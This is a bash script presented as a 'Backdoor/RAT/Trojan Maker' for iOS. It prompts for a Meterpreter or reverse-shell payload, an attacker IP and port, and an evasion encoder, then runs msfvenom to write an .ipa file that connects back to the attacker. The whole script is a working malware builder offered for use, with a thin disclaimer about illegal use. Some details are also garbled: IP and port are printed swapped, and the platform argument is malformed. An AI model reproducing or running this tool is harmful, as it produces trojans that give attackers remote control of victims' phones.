#! /bin/bash 

bold=`echo -en "\e[1m"`
 underline=`echo -en "\e[4m"`
 dim=`echo -en "\e[2m"`
 strickthrough=`echo -en "\e[9m"`
 blink=`echo -en "\e[5m"`
 reverse=`echo -en "\e[7m"`
 hidden=`echo -en "\e[8m"`
 normal=`echo -en "\e[0m"`
 black=`echo -en "\e[30m"`
 red=`echo -en "\e[31m"`
 green=`echo -en "\e[32m"`
 orange=`echo -en "\e[33m"`
 blue=`echo -en "\e[34m"`
 purple=`echo -en "\e[35m"`
 aqua=`echo -en "\e[36m"`
 gray=`echo -en "\e[37m"`
 darkgray=`echo -en "\e[90m"`
 lightred=`echo -en "\e[91m"`
 lightgreen=`echo -en "\e[92m"`
 lightyellow=`echo -en "\e[93m"`
 lightblue=`echo -en "\e[94m"`
 lightpurple=`echo -en "\e[95m"`
 lightaqua=`echo -en "\e[96m"`
 white=`echo -en "\e[97m"`
 default=`echo -en "\e[39m"`
 BLACK=`echo -en "\e[40m"`
 RED=`echo -en "\e[41m"`
 GREEN=`echo -en "\e[42m"`
 ORANGE=`echo -en "\e[43m"`
 BLUE=`echo -en "\e[44m"`
 PURPLE=`echo -en "\e[45m"`
 AQUA=`echo -en "\e[46m"`
 GRAY=`echo -en "\e[47m"`
 DARKGRAY=`echo -en "\e[100m"`
 LIGHTRED=`echo -en "\e[101m"`
 LIGHTGREEN=`echo -en "\e[102m"`
 LIGHTYELLOW=`echo -en "\e[103m"`
 LIGHTBLUE=`echo -en "\e[104m"`
 LIGHTPURPLE=`echo -en "\e[105m"`
 LIGHTAQUA=`echo -en "\e[106m"`
 WHITE=`echo -en "\e[107m"`
 DEFAULT=`echo -en "\e[49m"`
 
clear

echo "${normal}                     |\_/|"
echo '                     (O.o)'
echo '                     (> <)'
echo  
echo '            Im here to watch over you!'
echo ============================ Hi. ==========================================
echo 'Backdoor/RAT/Trojan Maker For iOS/iphone'
echo Written by: Ghosty/DeaDHackS 
echo Important: Make sure you have installed MSFvenom.
echo Do not try to use this script for illegal activities im not the cause of it!
echo ===========================================================================
echo NOTE: This script might be a bit advance for beginners...
echo Please read HowTo that is given with the script to see how to use it! 
echo ===========================================================================
echo Lets make our iOS backdoor!!
echo What type of backdoor do you need?
echo Choose by name:
echo ========================= Meterpreter Shell ===============================
echo [meter.1]. apple_ios/aarch64/meterpreter_reverse_http
echo [meter.2]. apple_ios/aarch64/meterpreter_reverse_https
echo [meter.3]. apple_ios/aarch64/meterpreter_reverse_tcp
echo ========================= Default iOS Shell ===============================
echo [shell.1]. apple_ios/aarch64/shell_reverse_tcp
read typebackdoor
echo Setting up backdoor...................DONE!
echo Backdoor = $typebackdoor
echo ===========================================================================
echo Do ifconfig in a terminal to see your local IP Address or go on google/firefox and type my ip to see your private IP address
echo Your local/Private IP address:
read ip
echo Setting up IP...DONE!
echo IP = $ip
echo =========================================================================== 
echo Depends your backdoor type.. just see at the end if its tcp, http, https.
echo We Recommend:
echo 'HTTPS & HTTP: 80/443'
echo 'TCP: 80/443/4444'
echo Or simply put a custom one...
echo Choose what port to listen on:
read port
echo Setting up Port...DONE!
echo Port = $port
echo ===========================================
echo Choose encoder by name:
echo =================== x86 =================== Meterpreter backdoors goes very well with those encoders.
echo [x86.1]. x86/shikata_ga_nai   
echo [x86.2]. x86/context_time
echo [x86.3]. x86/unicode_upper
echo [x86.4]. x86/unicode_mixed
echo [x86.5]. x86/countdown
echo =================== CMD ====================
echo [cmd.1]. cmd/echo
echo [cmd.2]. cmd/generic_sh
echo [cmd.3]. cmd/ifs
echo [cmd.4]. cmd/perl
echo [cmd.5]. cmd/powershell_base64
echo [cmd.6]. cmd/printf_php_mq
echo =================== x64 ====================
echo [x64.1]. x64/xor
echo [x64.2]. x64/zutto_dekiru
read encoder
echo Setting up the codes for $encoder ...........DONE!
echo Attempting to see if $encoder is avaible for $typebackdoor....DONE!
echo Encoder = $encoder
echo ============================================
echo Format = .ipa
echo Setting up format....DONE!
echo Format = .ipa
echo ============================================
echo IMPORT: MAKE SURE YOU PUT .ipa AT THE END OF THE NAME!
echo What name should we give to you baby-RAT?:
read name
echo Setting up name...DONE!
echo Name = $name
echo ============================================
echo Platform = iOS
echo Format = .ipa
echo Backdoor = $typebackdoor
echo IP = $port
echo Port = $ip
echo Encoder = $encoder
echo Name = $name
echo Path = /root/Desktop
echo ============================================
echo Creating shell codes ....
echo Getting encoder
echo            '|\_/|'
echo            '(O.o)'
echo            '(> <) Use my RATs well please... i didnt make them for nothing....'
echo               Take care of $name ... 

msfvenom --platform apple ios -p $typebackdoor LHOST=$ip LPORT=$port --encoder $encoder R > /root/Desktop/$name
